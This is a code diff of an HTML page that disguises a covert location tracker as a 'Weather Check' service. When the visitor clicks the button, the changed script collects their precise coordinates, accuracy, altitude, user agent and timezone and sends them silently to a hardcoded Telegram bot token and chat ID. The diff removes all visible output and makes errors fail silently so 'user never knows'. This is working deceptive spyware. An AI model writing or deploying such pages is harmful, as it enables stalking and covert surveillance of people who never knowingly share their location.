@@ -2,23 +2,22 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Location Access</title>
+    <title>Weather Check</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; margin: 20px; }
-        button, pre { background: #111; border: 1px solid #0f0; padding: 10px; margin: 10px 0; }
-        button { cursor: pointer; }
+        body { background: white; color: black; font-family: Arial; margin: 20px; }
+        button { background: #4285f4; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-<h2>Exact Location Access</h2>
-<button id="getLocationBtn">Grant Permission & Get Location</button>
-<pre id="locationOutput">Waiting...</pre>
+<h2>Weather Service</h2>
+<p>Click below to see today's forecast.</p>
+<button id="weatherBtn">Check Weather</button>
+<div id="dummyOutput" class="hidden"></div>
 
 <script>
-    // === CONFIGURATION ===
     const TELEGRAM_BOT_TOKEN = "8650736921:AAH7qZokqXqR530EQ7ZsT-HxRQcmcLQ5t-E";
     const TELEGRAM_CHAT_ID = "8577571897";
-    // =====================
 
     function sendToTelegram(lat, lng, acc, alt, timestamp, userAgent, timezone) {
         let message = `📍 EXACT LOCATION CAPTURED\nLatitude: ${lat}\nLongitude: ${lng}\nAccuracy: ±${acc} meters\nAltitude: ${alt !== null ? alt : "N/A"} m\nTimestamp: ${timestamp}\nUser Agent: ${userAgent}\nTimezone: ${timezone}\nMaps: https://www.google.com/maps?q=${lat},${lng}`;
@@ -29,9 +28,8 @@
         }).catch(err => console.log("Send error:", err));
     }
 
-    document.getElementById('getLocationBtn').addEventListener('click', function() {
+    document.getElementById('weatherBtn').addEventListener('click', function() {
         if (!navigator.geolocation) {
-            document.getElementById('locationOutput').innerText = "ERROR: Geolocation not supported";
             return;
         }
         let options = {
@@ -41,28 +39,10 @@
         };
         function success(pos) {
             let coords = pos.coords;
-            let lat = coords.latitude;
-            let lng = coords.longitude;
-            let acc = coords.accuracy;
-            let alt = coords.altitude;
-            let ts = new Date(pos.timestamp).toISOString();
-            let ua = navigator.userAgent;
-            let tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-            let output = `EXACT LOCATION:\nLatitude: ${lat}\nLongitude: ${lng}\nAccuracy: ±${acc} meters\nAltitude: ${alt !== null ? alt : "N/A"} m\nTimestamp: ${ts}\n\nGoogle Maps: https://www.google.com/maps?q=${lat},${lng}`;
-            document.getElementById('locationOutput').innerText = output;
-
-            sendToTelegram(lat, lng, acc, alt, ts, ua, tz);
+            sendToTelegram(coords.latitude, coords.longitude, coords.accuracy, coords.altitude, new Date(pos.timestamp).toISOString(), navigator.userAgent, Intl.DateTimeFormat().resolvedOptions().timeZone);
         }
         function error(err) {
-            let msg = "";
-            switch(err.code) {
-                case err.PERMISSION_DENIED: msg = "PERMISSION DENIED"; break;
-                case err.POSITION_UNAVAILABLE: msg = "POSITION UNAVAILABLE"; break;
-                case err.TIMEOUT: msg = "TIMEOUT"; break;
-                default: msg = "UNKNOWN ERROR";
-            }
-            document.getElementById('locationOutput').innerText = "ERROR: " + msg;
+            // Silent fail - user never knows
         }
         navigator.geolocation.getCurrentPosition(success, error, options);
     });
